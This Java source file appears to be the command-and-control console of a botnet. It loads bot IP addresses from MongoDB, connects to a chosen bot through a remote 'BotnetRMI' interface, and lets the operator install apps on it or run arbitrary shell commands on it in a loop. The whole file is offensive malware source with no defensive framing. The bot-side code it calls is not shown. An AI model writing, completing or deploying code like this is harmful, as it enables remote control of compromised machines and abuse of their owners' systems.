/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server;

import DBUtils.MongoConnect;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import rmi.IBotnet;

public class RMIServer {
    
    public static void main(String[] args) {
        try {
            TCPServer tcpServer = new TCPServer(2345);
            tcpServer.start();
            System.out.println(">>>>>INFO: Socket Server started!!!!!!!!");
            MongoConnect client = new MongoConnect();
            client.Connect();
            ArrayList<String> list = client.Read("bot_ip");
            while (true){
                System.out.println("Available IP:");
                for (int i = 0; i<list.size(); i++){
                    System.out.println((i+1) + ": " + list.get(i));
                }
                System.out.print("Select IP to control: ");
                Scanner scanner = new Scanner(System.in);
                
                Integer id = Integer.parseInt(scanner.nextLine());
                String ip = list.get(id-1);
                IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
                botnet.testing();
                
                System.out.println("Install app type: install");
                System.out.println("Run command type: exec");
                String install = scanner.nextLine();
                
                if(install.equals("install")){
                    System.out.println(">Install app/tools, pls wait 5-10 minutes!");
                    ArrayList<String> arrInstall = botnet.installApp();
                    for(String i:arrInstall){
                        System.out.println(i);
                    }
                    System.out.println("Completed");
                }
                else if(install.equals("exec")){
                    while(true){
                        String cmd = scanner.nextLine();
                        if(!cmd.equals("exit")){
                            ArrayList<String> arr = botnet.runCommand(cmd);
                            for(String i:arr){
                                System.out.println(i);
                            }
                        }
                        else{
                            break;
                        }
                    }
                }
            }
            
        } catch (RemoteException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NotBoundException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (MalformedURLException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
}
